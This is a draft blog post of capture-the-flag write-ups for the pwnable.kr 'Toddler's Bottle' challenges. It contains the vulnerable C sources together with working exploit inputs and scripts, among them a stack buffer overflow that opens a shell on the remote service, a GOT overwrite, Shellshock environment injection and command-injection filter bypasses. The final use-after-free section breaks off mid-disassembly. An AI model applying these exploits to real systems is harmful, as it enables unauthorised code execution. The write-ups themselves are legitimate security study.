+++
title = "Todlers Bottle write ups"
description = "Todlers Bottle write ups"
date ="2016-03-09"
draft = true
publishdate ="2016-03-09"
categories = ["security"]
tags = ["assembly", "linux", "binary"]
slug =  "todlers-bottle-write-ups-pwanable-kr"
project_url = "https://greyhat.dk/todlers-bottle-write-ups-pwanable-kr"
type = "post"
+++


Toddler's Bottle - fd

ifd@ubuntu:~$ cat fd.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}

fd@ubuntu:~$ ./fd 4659
learn about Linux file IO
fd@ubuntu:~$ ./fd 4658
learn about Linux file IO
fd@ubuntu:~$ ./fd 4657
learn about Linux file IO
fd@ubuntu:~$ man read
fd@ubuntu:~$ ./fd 4660
LETMEWIN
good job :)



Toddler's Bottle - collision

col@ubuntu:~$ cat col.c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

int main(int argc, char* argv[]){
	if(argc<2){
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

	if(hashcode == check_password( argv[1] )){
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}

col@ubuntu:~$ ./col $(python -c 'print "\xcc\xcc\xcc\x01"*4 + "\xbc\xd6\xa9\x1a"')


Toddler's Bottle - bof

cat bof.c                                                                                                                                                                (master) 1
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}

$ (python -c 'print "A"*52 + "\xbe\xba\xfe\xca"'; cat -)|nc pwnable.kr 9000                                                                                                  (master) 1
ls
bof
bof.c
flag
log
super.pl
cat flag


Toddler's Bottle - flag

http://pwnable.kr/bin/flag

kgn@kali:~$ upx -d -o flag.unupx flag
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2013
UPX 3.91        Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 30th 2013

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx: flag: FileAlreadyExistsException: flag.unupx: File exists

Unpacked 0 files.
kgn@kali:~$ rm flag.unupx
kgn@kali:~$ upx -d -o flag.unupx flag
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2013
UPX 3.91        Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 30th 2013

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    887219 <-    335288   37.79%  linux/ElfAMD   flag.unupx

Unpacked 1 file.
kgn@kali:~$ r2 flag.unupx
Warning: Cannot initialize dynamic section
[0x00401058]> aaa
Function too big at 0x496608
[0x00401058]> pdf @main
/ (fcn) sym.main 61
|          ; var int local_1      @ rbp-0x8
|          ; DATA XREF from 0x00401075 (entry0)
|          ;-- main:
|          ;-- sym.main:
|          0x00401164    55             push rbp
|          0x00401165    4889e5         mov rbp, rsp
|          0x00401168    4883ec10       sub rsp, 0x10
|          0x0040116c    bf58664900     mov edi, str.I_will_malloc___and_strcpy_the_flag_there._take_it. ; "I will malloc() and strcpy the flag there. take it." @ 0x496658
|          0x00401171    e80a0f0000     call sym._IO_puts               ; sym._setjmp+0x560 ;sym._setjmp() ; sym.puts
|          0x00401176    bf64000000     mov edi, 0x64                  ; 'd'
|          0x0040117b    e850880000     call sym.__libc_malloc          ; sym._setjmp+0x7eb0 ;sym._setjmp() ; sym.malloc
|          0x00401180    488945f8       mov qword [rbp-local_1], rax
|          0x00401184    488b15e50e2c.  mov rdx, qword [rip + 0x2c0ee5]  ; [0x6c2070:8]=0x496628 str.UPX...__sounds_like_a_delivery_service_:_ ; "(fI" @ 0x6c2070
|          0x0040118b    488b45f8       mov rax, qword [rbp-local_1]
|          0x0040118f    4889d6         mov rsi, rdx
|          0x00401192    4889c7         mov rdi, rax
|          0x00401195    e886f1ffff     call fcn.00400320 ;fcn.00400320()
|          0x0040119a    b800000000     mov eax, 0
|          0x0040119f    c9             leave
\          0x004011a0    c3             ret
[0x00401058]> px @ str.UPX...__sounds_like_a_delivery_service_:_
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x00496628  5550 582e 2e2e 3f20 736f 756e 6473 206c  UPX...? sounds l
0x00496638  696b 6520 6120 6465 6c69 7665 7279 2073  ike a delivery s
0x00496648  6572 7669 6365 203a 2900 0000 0000 0000  ervice :).......
0x00496658  4920 7769 6c6c 206d 616c 6c6f 63         I will malloc
[0x00401058]> quit
kgn@kali:~$ strings flag.unupx |grep UPX


Toddler's Bottle - passcode

passcode@ubuntu:~$ gdb -q ./passcode
Reading symbols from /home/passcode/passcode...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/passcode/passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
Welcome Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A!
enter passcode1 : enter passcode2 : checking...
Login Failed!
[Inferior 1 (process 54455) exited normally]
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048665 <+0>:	push   ebp
   0x08048666 <+1>:	mov    ebp,esp
   0x08048668 <+3>:	and    esp,0xfffffff0
   0x0804866b <+6>:	sub    esp,0x10
   0x0804866e <+9>:	mov    DWORD PTR [esp],0x80487f0
   0x08048675 <+16>:	call   0x8048450 <puts@plt>
   0x0804867a <+21>:	call   0x8048609 <welcome>
   0x0804867f <+26>:	call   0x8048564 <login>
   0x08048684 <+31>:	mov    DWORD PTR [esp],0x8048818
   0x0804868b <+38>:	call   0x8048450 <puts@plt>
   0x08048690 <+43>:	mov    eax,0x0
   0x08048695 <+48>:	leave
   0x08048696 <+49>:	ret
End of assembler dump.
(gdb) disassemble login
Dump of assembler code for function login:
   0x08048564 <+0>:	push   ebp
   0x08048565 <+1>:	mov    ebp,esp
   0x08048567 <+3>:	sub    esp,0x28
   0x0804856a <+6>:	mov    eax,0x8048770
   0x0804856f <+11>:	mov    DWORD PTR [esp],eax
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    eax,0x8048783
   0x0804857c <+24>:	mov    edx,DWORD PTR [ebp-0x10]
   0x0804857f <+27>:	mov    DWORD PTR [esp+0x4],edx
   0x08048583 <+31>:	mov    DWORD PTR [esp],eax
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    eax,ds:0x804a02c
   0x08048590 <+44>:	mov    DWORD PTR [esp],eax
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    eax,0x8048786
   0x0804859d <+57>:	mov    DWORD PTR [esp],eax
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    eax,0x8048783
   0x080485aa <+70>:	mov    edx,DWORD PTR [ebp-0xc]
   0x080485ad <+73>:	mov    DWORD PTR [esp+0x4],edx
   0x080485b1 <+77>:	mov    DWORD PTR [esp],eax
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:	mov    DWORD PTR [esp],0x8048799
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
   0x080485c5 <+97>:	cmp    DWORD PTR [ebp-0x10],0x528e6
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	mov    DWORD PTR [esp],0x80487a5
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	mov    DWORD PTR [esp],0x80487af
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave
   0x080485f0 <+140>:	ret
   0x080485f1 <+141>:	mov    DWORD PTR [esp],0x80487bd
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	mov    DWORD PTR [esp],0x0
   0x08048604 <+160>:	call   0x8048480 <exit@plt>
End of assembler dump.
(gdb) break *0x080485c0
Breakpoint 1 at 0x80485c0
(gdb) r
Starting program: /home/passcode/passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
Welcome Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A!

Breakpoint 1, 0x080485c0 in login ()
(gdb) x/p ebp-0x10
No symbol table is loaded.  Use the "file" command.
(gdb) x/p $ebp-0x10
0xff884e48:	Undefined output format "p".
(gdb) x/x $ebp-0x10
0xff884e48:	0x41326441


kgn@kali:~$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 0x41326441
[*] Exact match at offset 96

(gdb) quit
A debugging session is active.

	Inferior 1 [process 54483] will be killed.

Quit anyway? (y or n) y
passcode@ubuntu:~$ objdump -R passcode

passcode:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a02c R_386_COPY        stdin
0804a000 R_386_JUMP_SLOT   printf
0804a004 R_386_JUMP_SLOT   fflush
0804a008 R_386_JUMP_SLOT   __stack_chk_fail
0804a00c R_386_JUMP_SLOT   puts
0804a010 R_386_JUMP_SLOT   system
0804a014 R_386_JUMP_SLOT   __gmon_start__
0804a018 R_386_JUMP_SLOT   exit
0804a01c R_386_JUMP_SLOT   __libc_start_main
0804a020 R_386_JUMP_SLOT   __isoc99_scanf


passcode@ubuntu:~$ python -c 'print "A"*96 + "\x04\xa0\x04\x08" + "134514147"|.passcode
> ^C
passcode@ubuntu:~$ python -c 'print "A"*96 + "\x04\xa0\x04\x08" + "134514147"'|./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
enter passcode1 : Now I can safely trust you that you have credential :)


Toddler's Bottle - random

random@ubuntu:~$ cat random.c
#include <stdio.h>

int main(){
	unsigned int random;
	random = rand();	// random value!

	unsigned int key=0;
	scanf("%d", &key);

	if( (key ^ random) == 0xdeadbeef ){
		printf("Good!\n");
		system("/bin/cat flag");
		return 0;
	}

	printf("Wrong, maybe you should try 2^32 cases.\n");
	return 0;
}

random@ubuntu:~$ ./random
-2147483648
Wrong, maybe you should try 2^32 cases.
random@ubuntu:~$ gdb -q randomError: can not access /proc.

Reading symbols from /home/random/random...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x00000000004005f4 <+0>:	push   rbp
   0x00000000004005f5 <+1>:	mov    rbp,rsp
   0x00000000004005f8 <+4>:	sub    rsp,0x10
   0x00000000004005fc <+8>:	mov    eax,0x0
   0x0000000000400601 <+13>:	call   0x400500 <rand@plt>
   0x0000000000400606 <+18>:	mov    DWORD PTR [rbp-0x4],eax
   0x0000000000400609 <+21>:	mov    DWORD PTR [rbp-0x8],0x0
   0x0000000000400610 <+28>:	mov    eax,0x400760
   0x0000000000400615 <+33>:	lea    rdx,[rbp-0x8]
   0x0000000000400619 <+37>:	mov    rsi,rdx
   0x000000000040061c <+40>:	mov    rdi,rax
   0x000000000040061f <+43>:	mov    eax,0x0
   0x0000000000400624 <+48>:	call   0x4004f0 <__isoc99_scanf@plt>
   0x0000000000400629 <+53>:	mov    eax,DWORD PTR [rbp-0x8]
   0x000000000040062c <+56>:	xor    eax,DWORD PTR [rbp-0x4]
   0x000000000040062f <+59>:	cmp    eax,0xdeadbeef
   0x0000000000400634 <+64>:	jne    0x400656 <main+98>
   0x0000000000400636 <+66>:	mov    edi,0x400763
   0x000000000040063b <+71>:	call   0x4004c0 <puts@plt>
   0x0000000000400640 <+76>:	mov    edi,0x400769
   0x0000000000400645 <+81>:	mov    eax,0x0
   0x000000000040064a <+86>:	call   0x4004d0 <system@plt>
   0x000000000040064f <+91>:	mov    eax,0x0
   0x0000000000400654 <+96>:	jmp    0x400665 <main+113>
   0x0000000000400656 <+98>:	mov    edi,0x400778
   0x000000000040065b <+103>:	call   0x4004c0 <puts@plt>
   0x0000000000400660 <+108>:	mov    eax,0x0
   0x0000000000400665 <+113>:	leave
   0x0000000000400666 <+114>:	ret
End of assembler dump.
(gdb) break *0x0000000000400615
Breakpoint 1 at 0x400615
(gdb) r
Starting program: /home/random/random

Breakpoint 1, 0x0000000000400615 in main ()
(gdb) x/x $rbp-0x4
0x7fff504893bc:	0x6b8b4567
(gdb) x/x $rbp-0x8
0x7fff504893b8:	0x00000000
(gdb) !echo "ibase=16; 6B8B4567"|bc
1804289383
(gdb) !echo "ibase=16;DEADBEEF"|bc
3735928559
(gdb) !python -c 'print 1804289383^3735928559'
3039230856
(gdb) c
Continuing.
3039230856
Good!
/bin/cat: flag: Permission denied
[Inferior 1 (process 60632) exited normally]
(gdb) quit
random@ubuntu:~$ ./random
3039230856
Good!


Toddler's Bottle - input


my solution

mkdir -p /tmp/desdic && cd /tmp/desdic && ln -s /home/input/flag .

cat /home/input/input.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
	printf("Welcome to pwnable.kr\n");
	printf("Let's see if you know how to give input to program\n");
	printf("Just give me correct inputs then you will get the flag :)\n");

	// argv
	if(argc != 100) return 0;
	if(strcmp(argv['A'],"\x00")) return 0;
	if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
	printf("Stage 1 clear!\n");

	// stdio
	char buf[4];
	read(0, buf, 4);
	if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
	read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
	printf("Stage 2 clear!\n");

	// env
	if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
	printf("Stage 3 clear!\n");

	// file
	FILE* fp = fopen("\x0a", "r");
	if(!fp) return 0;
	if( fread(buf, 4, 1, fp)!=1 ) return 0;
	if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
	fclose(fp);
	printf("Stage 4 clear!\n");

	// network
	int sd, cd;
	struct sockaddr_in saddr, caddr;
	sd = socket(AF_INET, SOCK_STREAM, 0);
	if(sd == -1){
		printf("socket error, tell admin\n");
		return 0;
	}
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = INADDR_ANY;
	saddr.sin_port = htons( atoi(argv['C']) );
	if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
		printf("bind error, use another port\n");
    		return 1;
	}
	listen(sd, 1);
	int c = sizeof(struct sockaddr_in);
	cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
	if(cd < 0){
		printf("accept error, tell admin\n");
		return 0;
	}
	if( recv(cd, buf, 4, 0) != 4 ) return 0;
	if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
	printf("Stage 5 clear!\n");

	// here's your flag
	system("/bin/cat flag");
	return 0;
}

#!/usr/bin/python

import os
import socket
import time

port = 10102

r1, w1 = os.pipe()
r2, w2 = os.pipe()

os.putenv('\xde\xad\xbe\xef', '\xca\xfe\xba\xbe')
f = open("\x0a", "w");
f.write("\x00\x00\x00\x00")
f.close()

if os.fork():
        os.close(w1)
        os.close(w2)
        os.dup2(r1, 0)
        os.dup2(r2, 2)
        os.execv('/home/input/input', ['input'] + ['A'] * 64 + [''] + ['\x20\x0a\x0d'] + [str(port)] + ['A']*32)

else:
        os.close(r1)
        os.close(r2)
        f1 = os.fdopen(w1,'w')
        f2 = os.fdopen(w2,'w')
        f1.write('\x00\x0a\x00\xff')
        f2.write('\x00\x0a\x02\xff')
        f1.close()
        f2.close()
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect(('127.0.0.1', port))
        c.send('\xde\xad\xbe\xef')
        c.close()


Toddler's Bottle - leg

https://wiki.ubuntu.com/ARM/Thumb2PortingHowto
- http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0204g/CEGIBCCG.html

(gdb) disass main
Dump of assembler code for function main:
   0x00008d3c <+0>:	push	{r4, r11, lr}
   0x00008d40 <+4>:	add	r11, sp, #8
   0x00008d44 <+8>:	sub	sp, sp, #12
   0x00008d48 <+12>:	mov	r3, #0
   0x00008d4c <+16>:	str	r3, [r11, #-16]
   0x00008d50 <+20>:	ldr	r0, [pc, #104]	; 0x8dc0 <main+132>
   0x00008d54 <+24>:	bl	0xfb6c <printf>
   0x00008d58 <+28>:	sub	r3, r11, #16
   0x00008d5c <+32>:	ldr	r0, [pc, #96]	; 0x8dc4 <main+136>
   0x00008d60 <+36>:	mov	r1, r3
   0x00008d64 <+40>:	bl	0xfbd8 <__isoc99_scanf>
   0x00008d68 <+44>:	bl	0x8cd4 <key1>
   0x00008d6c <+48>:	mov	r4, r0
   0x00008d70 <+52>:	bl	0x8cf0 <key2>
   0x00008d74 <+56>:	mov	r3, r0
   0x00008d78 <+60>:	add	r4, r4, r3
   0x00008d7c <+64>:	bl	0x8d20 <key3>
   0x00008d80 <+68>:	mov	r3, r0
   0x00008d84 <+72>:	add	r2, r4, r3
   0x00008d88 <+76>:	ldr	r3, [r11, #-16]
   0x00008d8c <+80>:	cmp	r2, r3
   0x00008d90 <+84>:	bne	0x8da8 <main+108>
   0x00008d94 <+88>:	ldr	r0, [pc, #44]	; 0x8dc8 <main+140>
   0x00008d98 <+92>:	bl	0x1050c <puts>
   0x00008d9c <+96>:	ldr	r0, [pc, #40]	; 0x8dcc <main+144>
   0x00008da0 <+100>:	bl	0xf89c <system>
   0x00008da4 <+104>:	b	0x8db0 <main+116>
   0x00008da8 <+108>:	ldr	r0, [pc, #32]	; 0x8dd0 <main+148>
   0x00008dac <+112>:	bl	0x1050c <puts>
   0x00008db0 <+116>:	mov	r3, #0
   0x00008db4 <+120>:	mov	r0, r3
   0x00008db8 <+124>:	sub	sp, r11, #8
   0x00008dbc <+128>:	pop	{r4, r11, pc}
   0x00008dc0 <+132>:	andeq	r10, r6, r12, lsl #9
   0x00008dc4 <+136>:	andeq	r10, r6, r12, lsr #9
   0x00008dc8 <+140>:			; <UNDEFINED> instruction: 0x0006a4b0
   0x00008dcc <+144>:			; <UNDEFINED> instruction: 0x0006a4bc
   0x00008dd0 <+148>:	andeq	r10, r6, r4, asr #9
End of assembler dump.
(gdb) disass key1
Dump of assembler code for function key1:
   0x00008cd4 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cd8 <+4>:	add	r11, sp, #0
   0x00008cdc <+8>:	mov	r3, pc
   0x00008ce0 <+12>:	mov	r0, r3
   0x00008ce4 <+16>:	sub	sp, r11, #0
   0x00008ce8 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008cec <+24>:	bx	lr
End of assembler dump.

0x00008cdc + 8 = 8CE4

(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008cf4 <+4>:	add	r11, sp, #0
   0x00008cf8 <+8>:	push	{r6}		; (str r6, [sp, #-4]!)
   0x00008cfc <+12>:	add	r6, pc, #1
   0x00008d00 <+16>:	bx	r6
   0x00008d04 <+20>:	mov	r3, pc
   0x00008d06 <+22>:	adds	r3, #4
   0x00008d08 <+24>:	push	{r3}
   0x00008d0a <+26>:	pop	{pc}
   0x00008d0c <+28>:	pop	{r6}		; (ldr r6, [sp], #4)
   0x00008d10 <+32>:	mov	r0, r3
   0x00008d14 <+36>:	sub	sp, r11, #0
   0x00008d18 <+40>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d1c <+44>:	bx	lr
End of assembler dump.

0x00008d04 + 4 + 4
8D0C

(gdb) disass key3
Dump of assembler code for function key3:
   0x00008d20 <+0>:	push	{r11}		; (str r11, [sp, #-4]!)
   0x00008d24 <+4>:	add	r11, sp, #0
   0x00008d28 <+8>:	mov	r3, lr
   0x00008d2c <+12>:	mov	r0, r3
   0x00008d30 <+16>:	sub	sp, r11, #0
   0x00008d34 <+20>:	pop	{r11}		; (ldr r11, [sp], #4)
   0x00008d38 <+24>:	bx	lr
End of assembler dump.
(gdb)

0x00008d80 (lr = return address)

8CE4 + 8D0C + 8D80


python -c 'print (0x00008cdc + 8) + (((0x00008d04 &~ 3) + 4) +4) + 0x00008d80'
108400


Toddler's Bottle - mistake

take@ubuntu:~$ cat mistake.c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
	int i;
	for(i=0; i<len; i++){
		s[i] ^= XORKEY;
	}
}

int main(int argc, char* argv[]){

	int fd;
	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
	}

	printf("do not bruteforce...\n");
	sleep(time(0)%20);

	char pw_buf[PW_LEN+1];
	int len;
	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
		printf("read error\n");
		close(fd);
		return 0;
	}

	char pw_buf2[PW_LEN+1];
	printf("input password : ");
	scanf("%10s", pw_buf2);

	// xor your input
	xor(pw_buf2, 10);

	if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
		printf("Password OK\n");
		system("/bin/cat flag\n");
	}
	else{
		printf("Wrong Password\n");
	}

	close(fd);
	return 0;
}

mistake@ubuntu:~$ ./mistake
do not bruteforce...
1111111111
input password : 0000000000
Password OK


Toddler's Bottle - shellshock

shellshock@ubuntu:~$ cat shellshock.c
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}

shellshock@ubuntu:~$ env x='() { :;}; echo vulnerable' /home/shellshock/bash -c "echo this is a test"
vulnerable
this is a test
shellshock@ubuntu:~$ env x='() { :;}; cat flag' ./shellshock
/home/shellshock/bash: cat: No such file or directory
Segmentation fault
shellshock@ubuntu:~$ env x='() { :;}; /bin/cat flag' ./shellshock

Toddler's Bottle - coin1

#!/usr/bin/env python

import re
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("0.0.0.0", 9007))

left, right, mid = 0, 0, 0

while True:
    lines = s.recv(1024).splitlines()
    for line in lines:
        print line
        match = re.search('^N=([0-9]+)\s+C=([0-9]+)', line.strip())
        if match:
                left = 0
                right =  int(match.group(1))
                mid = right/2 + right%2
                payload = " ".join(str(x) for x in range(left, mid)) + "\n"
                print "Sending " + payload
                s.send(payload)
        match = re.search('^([0-9]+)', line)
        if match:
                weight = int(match.group(0))
                if weight < (mid-left)*10:
                        right = mid
                else:
                        left = mid
                mid = left + (right-left)/2 + (right-left)%2

                payload = " ".join(str(x) for x in range(left, mid)) + "\n"
                s.send(payload)
        if re.search('expire', line):
                exit(0)


Toddler's Bottle - blackjack

Integer overflow .. enter  10000000000 and play

Toddler's Bottle - lotto

lotto@ubuntu:~$ cat lotto.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){

	int i;
	printf("Submit your 6 lotto bytes : ");
	fflush(stdout);

	int r;
	r = read(0, submit, 6);

	printf("Lotto Start!\n");
	//sleep(1);

	// generate lotto numbers
	int fd = open("/dev/urandom", O_RDONLY);
	if(fd==-1){
		printf("error. tell admin\n");
		exit(-1);
	}
	unsigned char lotto[6];
	if(read(fd, lotto, 6) != 6){
		printf("error2. tell admin\n");
		exit(-1);
	}
	for(i=0; i<6; i++){
	lotto[i] = (lotto[i] % 45) + 1;		// 1 ~ 45
	}
	close(fd);

	// calculate lotto score
	int match = 0, j = 0;
	for(i=0; i<6; i++){
		for(j=0; j<6; j++){
			if(lotto[i] == submit[j]){
				match++;
			}
		}
	}

	// win!
	if(match == 6){
		system("/bin/cat flag");
	}
	else{
		printf("bad luck...\n");
	}

}

void help(){
	printf("- nLotto Rule -\n");
	printf("nlotto is consisted with 6 random natural numbers less than 46\n");
	printf("your goal is to match lotto numbers as many as you can\n");
	printf("if you win lottery for *1st place*, you will get reward\n");
	printf("for more details, follow the link below\n");
	printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
	printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){

	// menu
	unsigned int menu;

	while(1){

		printf("- Select Menu -\n");
		printf("1. Play Lotto\n");
		printf("2. Help\n");
		printf("3. Exit\n");

		scanf("%d", &menu);

		switch(menu){
			case 1:
				play();
				break;
			case 2:
				help();
				break;
			case 3:
				printf("bye\n");
				return 0;
			default:
				printf("invalid menu\n");
				break;
		}
	}
	return 0;
}

vulnerable code


	// calculate lotto score
	int match = 0, j = 0;
	for(i=0; i<6; i++){
		for(j=0; j<6; j++){
			if(lotto[i] == submit[j]){
				match++;
			}
		}
	}


I keept entering !!!!!! and win

Toddler's Bottle - cmd1

md1@ubuntu:~$ cat cmd1.c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "flag")!=0;
	r += strstr(cmd, "sh")!=0;
	r += strstr(cmd, "tmp")!=0;
	return r;
}
int main(int argc, char* argv[], char** envp){
	putenv("PATH=/fuckyouverymuch");
	if(filter(argv[1])) return 0;
	system( argv[1] );
	return 0;
}

./cmd1 "/bin/cat *"


Toddler's Bottle - cmd2

cmd2@ubuntu:~$ cat cmd2.c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}

mkdir /tmp/de && cd /tmp/de
ln -s /home/cmd2/flag lala
ln -s /bin/cat .
ln -s /home/cmd2/cmd2 .

cmd2@ubuntu:/tmp/de$ ./cmd2 '$(echo "\56")$(echo "\57")cat lala'
$(echo "\56")$(echo "\57")cat lala


Toddler's Bottle - uaf

#include <fcntl.h>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;
}


break 0x0000000000400ff6

  0x0000000000400fd4 <+272>:	add    rax,0x8
   0x0000000000400fd8 <+276>:	mov    rdx,QWORD PTR [rax]
   0x0000000000400fdb <+279>:	mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fdf <+283>:	mov    rdi,rax
